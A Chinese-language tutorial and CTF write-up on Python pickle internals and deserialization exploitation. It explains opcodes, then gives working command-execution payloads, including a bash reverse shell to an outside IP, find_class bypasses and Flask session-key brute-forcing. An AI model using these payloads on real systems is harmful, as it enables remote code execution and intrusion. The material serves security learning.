(PVM)是Python语言中的一个虚拟机，用于序列化和反序列化Python对象。它是Python标准库中的一部分，由Python的pickle模块提供支持。下面是Pickle Virtual Machine的运行原理： 生成操作码序列：pickle模块在序列化Python对象时，会生成一系列操作码（opcode）来表示对象的类型和值。这些操作码将被保存到文件或网络流中，以便在反序列化时使用。 反序列化操作码：在反序列化时，pickle模块读取操作码序列，并将其解释为Python对象。它通过Pickle Virtual Machine来执行操作码序列。Virtual Machine会按顺序读取操作码，并根据操作码的类型执行相应的操作。 执行操作码：Pickle Virtual Machine支持多种操作码，包括压入常量、调用函数、设置属性等。执行操作码的过程中，Virtual Machine会维护一个栈来存储数据。当执行操作码时，它会将数据从栈中取出，并根据操作码的类型进行相应的操作。执行完成后，结果将被压入栈中。 构造Python对象：当操作码序列被完全执行后，Pickle Virtual Machine会将栈顶的数据作为结果返回。这个结果就是反序列化后的Python对象。 常用的opcode 指令 描述 具体写法 栈上的变化 c 获取一个全局对象或import一个模块 c[module]\\n[instance]\\n 获得的对象入栈 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module]\\n[callable]\\n 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 N 实例化一个None N 获得的对象入栈 S 实例化一个字符串对象 S’xxx’\\n 获得的对象入栈 V 实例化一个UNICODE字符串对象 Vxxx\\n 获得的对象入栈 I 实例化一个int对象 Ixxx\\n 获得的对象入栈 F 实例化一个float对象 Fx.x\\n 获得的对象入栈 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 ) 向栈中直接压入一个空元组 ) 空元组入栈 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 ] 向栈中直接压入一个空列表 ] 空列表入栈 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 } 向栈中直接压入一个空字典 } 空字典入栈 p 将栈顶对象储存至memo_n pn\\n 无 g 将memo_n的对象压栈 gn\\n 对象被压栈 0 丢弃栈顶对象 0 栈顶对象被丢弃 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 所有opcode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485MARK = b'(' # push special markobject on stackSTOP = b'.' # every pickle ends with STOPPOP = b'0' # discard topmost stack itemPOP_MARK = b'1' # discard stack top through topmost markobjectDUP = b'2' # duplicate top stack itemFLOAT = b'F' # push float object; decimal string argumentINT = b'I' # push integer or bool; decimal string argumentBININT = b'J' # push four-byte signed intBININT1 = b'K' # push 1-byte unsigned intLONG = b'L' # push long; decimal string argumentBININT2 = b'M' # push 2-byte unsigned intNONE = b'N' # push NonePERSID = b'P' # push persistent object; id is taken from string argBINPERSID = b'Q' # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b'R' # apply callable to argtuple, both on stackSTRING = b'S' # push string; NL-terminated string argumentBINSTRING = b'T' # push string; counted binary string argumentSHORT_BINSTRING= b'U' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argumentBINUNICODE = b'X' # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b'a' # append stack top to list below itBUILD = b'b' # call __setstate__ or __dict__.update()GLOBAL = b'c' # push self.find_class(modname, name); 2 string argsDICT = b'd' # build a dict from stack itemsEMPTY_DICT = b'}' # push empty dictAPPENDS = b'e' # extend list on stack by topmost stack sliceGET = b'g' # push item from memo on stack; index is string argBINGET = b'h' # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b'i' # build &amp; push class instanceLONG_BINGET = b'j' # push item from memo on stack; index is 4-byte argLIST = b'l' # build list from topmost stack itemsEMPTY_LIST = b']' # push empty listOBJ = b'o' # build &amp; push class instancePUT = b'p' # store stack top in memo; index is string argBINPUT = b'q' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b'r' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b's' # add key+value pair to dictTUPLE = b't' # build tuple from topmost stack itemsEMPTY_TUPLE = b')' # push empty tupleSETITEMS = b'u' # modify dict by adding topmost key+value pairsBINFLOAT = b'G' # push float; arg is 8-byte float encodingTRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.pyFALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO = b'\\x80' # identify pickle protocolNEWOBJ = b'\\x81' # build object by applying cls.__new__ to argtupleEXT1 = b'\\x82' # push object from extension registry; 1-byte indexEXT2 = b'\\x83' # ditto, but 2-byte indexEXT4 = b'\\x84' # ditto, but 4-byte indexTUPLE1 = b'\\x85' # build 1-tuple from stack topTUPLE2 = b'\\x86' # build 2-tuple from two topmost stack itemsTUPLE3 = b'\\x87' # build 3-tuple from three topmost stack itemsNEWTRUE = b'\\x88' # push TrueNEWFALSE = b'\\x89' # push FalseLONG1 = b'\\x8a' # push long from &lt; 256 bytesLONG4 = b'\\x8b' # push really big long_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES = b'B' # push bytes; counted binary string argumentSHORT_BINBYTES = b'C' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE = b'\\x8c' # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8 = b'\\x8d' # push very long stringBINBYTES8 = b'\\x8e' # push very long bytes stringEMPTY_SET = b'\\x8f' # push empty set on the stackADDITEMS = b'\\x90' # modify set by adding topmost stack itemsFROZENSET = b'\\x91' # build frozenset from topmost stack itemsNEWOBJ_EX = b'\\x92' # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL = b'\\x93' # same as GLOBAL but using names on the stacksMEMOIZE = b'\\x94' # store top of the stack in memoFRAME = b'\\x95' # indicate the beginning of a new frame# Protocol 5BYTEARRAY8 = b'\\x96' # push bytearrayNEXT_BUFFER = b'\\x97' # push next out-of-band bufferREADONLY_BUFFER = b'\\x98' # make top of stack readonly opcode源码分析1234567891011import pickleclass test: def __init__(self): self.people = 'lituer'a = test()serialized = pickle.dumps(a, protocol=3) # 指定PVM 协议版本print(serialized)unserialized = pickle.loads(serialized) # 注意，loads 能够自动识别反序列化的版本print(unserialized.people) 1'\\x80\\x03c__main__\\ntest\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00peopleq\\x03X\\x06\\x00\\x00\\x00lituerq\\x04sb.' 下面分析一整段opcode码的作用 \\x80\\x03 源码 123456def load_proto(self): proto = self.read(1)[0] if not 0 &amp;lt;= proto &amp;lt;= HIGHEST_PROTOCOL: raise ValueError(&quot;unsupported pickle protocol: %d&quot; % proto) self.proto = proto dispatch[PROTO[0]] = load_proto 代码首先从输入流中读取一个字节并将其存储在 proto 变量中。然后，它检查该变量的值是否在合法的 pickle 协议范围内，如果不是，则引发一个 ValueError 异常，指示不支持的协议。最后，它将 proto 变量的值存储在对象的 proto 属性中，这两个字节就是判断版本号的； c 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）会加入self.stack 源代码： 123456789def load_global(self): #往后读到换行符作为模块名 __main__ module = self.readline()[:-1].decode(&quot;utf-8&quot;) #往后读到换行符作为类名 animal name = self.readline()[:-1].decode(&quot;utf-8&quot;) #进入find_class klass = self.find_class(module, name) self.append(klass)#获取模块后添加到当前栈中dispatch[GLOBAL[0]] = load_global find_class()函数 12345678910111213141516171819def find_class(self, module, name): # 在系统审核日志中记录“pickle.find_class”事件，包括模块名和对象名 sys.audit('pickle.find_class', module, name) # 如果协议版本小于3且开启了fix_imports标志，则进行特殊的名称和模块映射处理 if self.proto &lt; 3 and self.fix_imports: # 如果(module, name)在NAME_MAPPING中，则使用映射的名称代替原名称 if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] # 如果module在IMPORT_MAPPING中，则使用映射的模块名代替原模块名 elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] # 动态加载指定模块 __import__(module, level=0) # 如果协议版本大于等于4，则使用_getattribute方法获取对象 if self.proto &gt;= 4: return _getattribute(sys.modules[module], name)[0] # 否则，使用getattr方法获取对象 else: return getattr(sys.modules[module], name) 然后self.append(klass)添加到当前栈中,所以当前栈中有： 1self=&amp;gt; stack:[类] q 对应源码 12345678910111213def load_binput(self): # 从输入流中读取一个字节作为索引，表示待保存对象在memo字典中的位置 i = self.read(1)[0] # 如果读取到的索引小于0，则引发ValueError异常 if i &lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) # 将当前堆栈顶部的对象保存到memo字典中，使用读取到的索引作为键值 self.memo[i] = self.stack[-1] # 将memo字典添加到堆栈中 self.append(self.memo)# 将load_binput函数注册到pickle库的分发表中，以便在序列化时调用dispatch[BINPUT[0]] = load_binput 所以记忆栈中存在了test类 1memo=&amp;gt; stack:[类] ) 123def load_empty_tuple(self): self.append(())#向当前栈中增加一个新的元组 dispatch[EMPTY_TUPLE[0]] = load_empty_tuple 操作完之后栈区就变成了 1self=&amp;gt; stack:[类，()] \\x81 弹出self栈中的两个元素 然后把参数传入__new__对类进行实例化 1234567def load_newobj(self): args = self.stack.pop() # 空元组() cls = self.stack.pop() # obj = cls.__new__(cls, *args) #__new__方法的作用是修改不可变类(int,String)等基本类都是不可变类，此处不需修改，所以传入元组 self.append(obj) #将实例化的test给self这个self栈中dispatch[NEWOBJ[0]] = load_newobj 这时的self栈区 1self=&amp;gt; stack:[(对象)] q 把self中的对象压入memo栈中 123456def load_binput(self): i = self.read(1)[0]#继续读取下一个字节，赋值给i if i &amp;lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) self.memo[i] = self.stack[-1]#将栈中的栈尾(与栈顶相对)存入记忆栈中memodispatch[BINPUT[0]] = load_binput 当前的memo栈有 1memo=&amp;gt; stack:[(类) , (对象)] } 向栈区压入一个空字典 123def load_empty_dictionary(self): self.append({}) dispatch[EMPTY_DICT[0]] = load_empty_dictionary 当前self栈 1self=&amp;gt; stack:[(对象)，{}] q 123456def load_binput(self): i = self.read(1)[0] if i &amp;lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) self.memo[i] = self.stack[-1]#将栈中的栈尾栈顶存入记忆栈中memo dispatch[BINPUT[0]] = load_binput 当前memo栈 1memo=&amp;gt; stack:[(类) , (对象),{}] X 源码 12345678def load_binunicode(self): len, = unpack('&lt;i&gt;6 if len &amp;gt; maxsize: #这里的6也就是后面的x06也就是属性名字符串的长度 raise UnpicklingError(&quot;BINUNICODE exceeds system's maximum size &quot; &quot;of %d bytes&quot; % maxsize) self.append(str(self.read(len), 'utf-8', 'surrogatepass')) #再往后读len长度的字节数 people（属性名） 然后存入到栈中中dispatch[BINUNICODE[0]] = load_binunicode 所以self栈中就是 1self=&amp;gt; stack:[(对象),{},&quot;people&quot;] q 和上面的思路一样，不多赘述了 此时的memo栈中的内容如下 1memo=&amp;gt; stack:[(类) , (对象),{},&quot;people&quot;] X 读取后面的\\x03识别长度为三的字符串 12345678def load_binunicode(self): len, = unpack('&lt;i&gt; 3 if len &amp;gt; maxsize: #读取后面的\\x03识别长度为三的字符串 raise UnpicklingError(&quot;BINUNICODE exceeds system's maximum size &quot; &quot;of %d bytes&quot; % maxsize) self.append(str(self.read(len), 'utf-8', 'surrogatepass')) dog #再往后读len长度的字节数 lituer（属性值） 然后存入到栈中中dispatch[BINUNICODE[0]] = load_binunicode 此时self栈中的内容 1self=&amp;gt; stack:[(对象),{},&quot;people&quot;,&quot;lituer&quot;] q 123456def load_binput(self): i = self.read(1)[0]#继续读取下一个字节 \\x04 ，赋值给i if i &amp;lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) self.memo[i] = self.stack[-1] dispatch[BINPUT[0]] = load_binput 当前memo的栈中的内容 1memo=&amp;gt; stack:[(类) , (对象),{},&quot;people&quot;,&quot;lituer&quot;] s 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中 对应源码 12345678910 def load_setitem(self): stack = self.stack value = stack.pop() #&quot;people&quot; key = stack.pop() #&quot;lituer&quot; #弹出这两个对象 dict = stack[-1] #栈顶{} # dict[key] = value #{&quot;people&quot;:&quot;lituer&quot;} dispatch[SETITEM[0]] = load_setitemself=&amp;gt; stack:[(对象),{&quot;people&quot;:&quot;lituer&quot;}] b 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 setstate 或 dict.update() 源码 123456789101112131415161718192021222324252627 def load_build(self): stack = self.stack state = stack.pop() #{&quot;people&quot;:&quot;lituer&quot;} inst = stack[-1] #(对象) setstate = getattr(inst, &quot;__setstate__&quot;, None) if setstate is not None: #检查是否存在 __setstate__ 方法 一般是不存在的 ############################################### setstate(state) ###########会造成任意函数调用 ############################################ return slotstate = None if isinstance(state, tuple) and len(state) == 2: state, slotstate = state if state: inst_dict = inst.__dict__ intern = sys.intern for k, v in state.items(): if type(k) is str: inst_dict[intern(k)] = v else: inst_dict[k] = v if slotstate: for k, v in slotstate.items(): setattr(inst, k, v) dispatch[BUILD[0]] = load_buildself=&amp;gt; stack:[(拥有数据的对象) 所以最后栈顶的内容就是反序列化后的内容 . 结束反序列化 1234def load_stop(self): value = self.stack.pop() raise _Stop(value)dispatch[STOP[0]] = load_stop 至此整个反序列化过程结束，相信到此为止PVM的工作原理有了一个明确的了解 利用思路命令执行__reduce__1234567891011121314151617import pickleimport osimport base64class zIxyd(object): def __reduce__(self): s = &quot;whoami&quot; return os.system, (s,)payload = zIxyd()serialze = pickle.dumps(payload)base64_data = base64.b64encode(serialze)print(base64_data)pickle.loads(serialze)#b'gASVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4='#king\\24603 注意：部分Linux系统下和Windows下的opcode字节流并不兼容，比如Windows下执行系统命令函数为nt.system()，在部分Linux下则为posix.system(); 用eval函数 123456789101112import pickleimport base64class zIxyd(object): def __reduce__(self): return (eval, (&quot;__import__('os').system('/bin/bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\&quot;')&quot;,))payload = zIxyd()pickle_a = pickle.dumps(payload)encoded_data = base64.b64encode(pickle_a)print(encoded_data)#gASVbwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxTX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJy9iaW4vYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MS4xMy43Ni81NTU1IDA+JjEiJymUhZRSlC4= opcode可以调用函数的操作码： R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 1234opcode=b'''cossystem(S'whoami'tR.''' i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） 1234opcode=b'''(S'whoami'iossystem.''' o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） 1234opcode=b'''(cossystemS'whoami'o.''' b+__setstate__() b操作码对应的是load_build函数; 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 源码： 1234567891011121314151617181920212223242526272829303132def load_build(self): stack = self.stack state = stack.pop() # 获取栈的倒数第二个元素赋值给inst inst = stack[-1] # 获取inst对象的__setstate__属性 setstate = getattr(inst, &quot;__setstate__&quot;, None) if setstate is not None: #检查是否存在 __setstate__ 方法 一般是不存在的 ############################################### setstate(state) ###########会造成任意函数调用 // ############################################ return slotstate = None # 如果state是元组类型并且长度为2，将其分解为state和slotstate if isinstance(state, tuple) and len(state) == 2: state, slotstate = state ##如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并 if state: inst_dict = inst.__dict__ intern = sys.intern # 遍历state字典，将键名intern后赋值给inst_dict，键值直接赋值 for k, v in state.items(): if type(k) is str: inst_dict[intern(k)] = v else: inst_dict[k] = v # 如果slotstate不为空，遍历slotstate字典，并将其键值对赋值给inst对象 if slotstate: for k, v in slotstate.items(): setattr(inst, k, v)dispatch[BUILD[0]] = load_build 1__setstate__ ： 官方文档中，如果想要存储对象的状态，就可以使用__getstat__和__setstat__方法。由于 pickle 同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄open(file,'r')。 和他成对的还有 __getstate__ ，被反序列化时调用__setstate__，被序列化时调用__getstate__。重写时可以省略__setstate__，但__getstate__必须返回一个字典。如果__getstate__与__setstate__都被省略, 那么就默认自动保存和加载对象的属性字典__dict__。 目的： 1当前对象存在属性'__setstate__'，并且{'__setstate__': os.system} 第一种来自参考中的博客； 123456789101112131415161718192021222324import pickleclass Person: def __init__(self,age): self.age=ageopcode=b'''(c__main__PersonI18o}(S&quot;__setstate__&quot;cossystemubS&quot;whoami&quot;b.'''p=pickle.loads(opcode)#whoami# o 寻找栈中的上一个MARK,以之间的第一个数据(必须为函数)为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）# u 寻找栈中的上一个MARK,组合之间的数据(数据必须有偶数个,即呈key-value)并全部添加或更新到该MARK之前的一个元素(必须为字典)中#我把他翻译成人可以看懂的了。如下# __import__(&quot;__main__&quot;).Person(18).__setstate__ = __import__('os')#但是可以看到还是用到了o操作码 我自己根据上一个payload，进行了一点改造；利用\\x81返回一个Person对象；这样就不需要用到o操作码了；\\x81在opcode源码分析有详细讲 123456789101112131415import pickleclass Person: def __init__(self,age): self.age=ageopcode=b'''c__main__Person)\\x81}(S&quot;__setstate__&quot;cossystemubS&quot;whoami&quot;b.'''p=pickle.loads(opcode) 其实我还在一篇博客中看到另一种办法，只不过对于初学者的我来说，并没有完全看懂，先记录下来 123456789101112131415opcode=b'''c__main__Person)\\x81}X\\x0C\\x00\\x00\\x00__setstate__cossystemsbX\\x06\\x00\\x00\\x00whoamib.'''#字符c，往后读取两行，得到主函数和类，__main__.tttang#字符)，向栈中压入空元祖()#字符}，向栈中压入空字典{}#字符X，读取四位\\x0C\\x00\\x00\\x00__setstate__,得到__setstate__#字符c，向后读取两行，得到函数os.system#字符s，将第一个和第二个元素作为键值对，添加到第三个元素中，此时也就是{__main.tttang:()}，__setstate__,os.system#字符b，第一个元素出栈，此时也就是{'__setstate__': os.system},此时执行一次setstate(state)#字符X，往后读取四位x06\\x00\\x00\\x00whoami，即whoami#字符b，弹出元素whoami此时state为whoami，执行os.system(whoami)#字符.，结束反序列化 当然，思路是天马行空的，利用b操作码执行命令肯定不止这几种payload； \\x81 我个人感觉\\x81操作码，在导入危险模块(比如builtins)情况下，也可以利用 123456789101112131415161718192021222324import pickleimport builtinsopcode=b'''c__builtin__mapp00(S'whoami'tp10(cossystemg1tp20g0g2\\x81p30c__builtin__bytesp4(g3t\\x81.'''pickle.loads(opcode)#__import__(&quot;builtins&quot;).bytes.__new__(__import__(&quot;builtins&quot;).bytes,__import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,('whoami',))) 变量覆盖__reduce__12345678910111213import picklekey1 = b'321'key2 = b'123'class zIxyd(object): def __reduce__(self): return (exec,(&quot;key1=b'1'\\nkey2=b'2'&quot;,))payload = zIxyd()pickle_a = pickle.dumps(payload)print(pickle_a)pickle.loads(pickle_a)print(key1, key2) opcode12#secret.pyname = &quot;zIxyd&quot; 123456789101112131415#test.pyimport pickleimport secretprint(&quot;secret:&quot;+secret.name)opcode=b'''c__main__secret(S'name'S'Hacker'db.'''result = pickle.loads(opcode)print(result.name)#secret:zIxyd#Hacker 实例化对象实例化对象是一种特殊的函数执行，这里简单的使用 R 构造一下，其他方式类似： 123456789101112131415# coding=utf-8import pickleclass Student: def __init__(self, name, age): self.name = name self.age = agedata=b'''c__main__Student(S'XiaoMing'S&quot;20&quot;tR.'''a=pickle.loads(data)print(a.name,a.age) pickle.Unpickler.find_class()由于官方针对pickle的安全问题的建议是修改find_class()，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。什么时候会调用find_class()： 从opcode角度看，当出现c、i、b'\\x93'时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。 从python代码来看，find_class()只会在解析opcode时调用一次，所以只要绕过opcode执行过程，find_class()就不会再调用，也就是说find_class()只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过__import__绕过一些黑名单。 下面先看两个例子： 12345678910safe_builtins = {'range','complex','set','frozenset','slice',}class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &quot;builtins&quot; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; %(module, name)) 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # 只允许__main__模块 return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name)) 第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为{'range','complex','set','frozenset','slice',}。 第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许__main__模块。虽然看起来很安全，但是被引入主程序的模块都可以通过__main__调用修改，所以造成了变量覆盖。 由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过find_class函数内的限制就是pickle反序列化解题的关键。此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把白名单模块的文档看一看:) CTF实战Code-Breaking:picklecode题目将pickle能够引入的模块限定为builtins，并且设置了子模块黑名单：{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}，于是我们能够直接利用的模块有： builtins模块中，黑名单外的子模块。 已经import的模块：io、builtins（需要先利用builtins模块中的函数） 黑名单中没有getattr，所以可以通过getattr获取io或builtins的子模块以及子模块的子模块:)，而builtins里有eval、exec等危险函数，即使在黑名单中，也可以通过getattr获得。pickle不能直接获取builtins一级模块，但可以通过builtins.globals()获得builtins；这样就可以执行任意代码了。payload为： 1234567891011121314151617181920212223import builtinsimport picklepayload=b&quot;&quot;&quot;cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1cbuiltinsgetattr(g1S'eval'tR(S'__import__(&quot;os&quot;).system(&quot;whoami&quot;)'tR.&quot;&quot;&quot;pickle.loads(payload)#翻译成人可以看懂的(搞了几十分钟才翻译出来)# builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)('__import__(&quot;os&quot;).system(&quot;whoami&quot;)') 首先执行getattr获取eval函数，再执行eval函数，这实际上是两步，而我们常用__reduce__生成的序列化字符串，只能执行一个函数；所以这题只能搓opcode；这题更多细节可以看p神 高校战疫网络安全分享赛:webtmp限制：重写了find_class函数，只能生成__main__模块的pickle： 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # 只允许__main__模块 return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name)) 此外，禁止了b'R'： 1234try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' 目标是覆盖secret中的验证，由于secret被主程序引入，是存在于__main__下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制： 1234567891011b'''c__main__secret(S'name'S&quot;1&quot;S&quot;category&quot;S&quot;2&quot;db0(S&quot;1&quot;S&quot;2&quot;i__main__Animal.''' 也就是修改secret中的内容，再修改Animal中的内容 [MTCTF 2022]easypickle12345678910111213141516171819202122232425262728293031323334import base64import picklefrom flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(2).hex()@app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices(&quot;admin&quot;, k=5)) return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin(): if session.get('user') != &quot;admin&quot;: return f&quot;&lt;script&gt;alert('Access Denied');window.location.href='/'&lt;/script&gt;&quot; else: try: a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) return &quot;ok&quot; except: return &quot;error!&quot;if __name__ == '__main__': app.run(host='0.0.0.0', port=8888) 爆破出secret-key 1234567import osfile_path='./key.txt'with open(file_path, 'w') as f: for i in range(1,99999): key = os.urandom(2).hex() f.write(&quot;\\&quot;{}\\&quot;\\n&quot;.format(key)) 123pip install flask-unsignflask-unsign --unsign --cookie &quot;eyJ1c2VyIjoiYWRuZGEifQ.ZcCoiA.4j5NXD8o0aO7M1_QlzclCXimORo&quot; --wordlist key.txtpython3 flask_session_cookie_manager3.py encode -s &quot;23a2&quot; -t &quot;{'username':'admin'}&quot; 这里主要看pickle 123456try: a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) return &quot;ok&quot; 算是逻辑漏洞吧 payload 非常巧妙；利用replace(b&quot;os&quot;, b&quot;Os&quot;)绕过对o操作码的限制； 1b'''(S'key1'\\nS'val1'\\ndS'vul'\\n(cos\\nsystem\\nVcalc\\nos.''' 但是我感觉预期解的payload应该是下面两这种，利用\\81操作码 1234567891011121314151617181920212223242526272829import pickleimport builtinsopcode=b'''c__builtin__mapp00(S'whoami'tp10(cossystemg1tp20g0g2\\x81p30c__builtin__bytesp4(g3t\\x81.'''pickle.loads(opcode)# p0 __import__(&quot;builtins&quot;).map# p1 ('whoami',)# p2 os.system,('whoami',)# p3 __import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,('whoami',))# p4 __import__(&quot;builtins&quot;).bytes# . __import__(&quot;builtins&quot;).bytes.__new__(__import__(&quot;builtins&quot;).bytes,__import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,('whoami',))) 下面这种paylaod还必须当前文件导入os模块才行 1234567891011121314151617181920212223242526import pickleimport builtinsimport osopcode = b'''c__builtin__mapp00(S'os.system(&quot;whoami&quot;)'tp10(c__builtin__execg1tp2g0g2\\x81p30c__builtin__bytesp40(g3tp30g4g3\\x81.'''pickle.loads(opcode)#__import__(&quot;builtins&quot;).bytes(__import__(&quot;builtins&quot;).map(__import__(&quot;builtins&quot;).exec,('os.system(&quot;whoami&quot;)',))) pker使用说明简介 pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。 使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。 再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。 此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。 具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。 使用方法与示例 pker中的针对pickle的特殊语法需要重点掌握（后文给出示例） 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。 pker主要用到GLOBAL、INST、OBJ三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用： 12345678910111213141516171819202122232425262728293031323334353637383940以下module都可以是包含`.`的子module调用函数时，注意传入的参数类型要和示例一致对应的opcode会被生成，但并不与pker代码相互等价GLOBAL对应opcode：b'c'获取module下的一个全局对象（没有import的也可以，比如下面的os）：GLOBAL('os', 'system')输入：module,instance(callable、module都是instance) 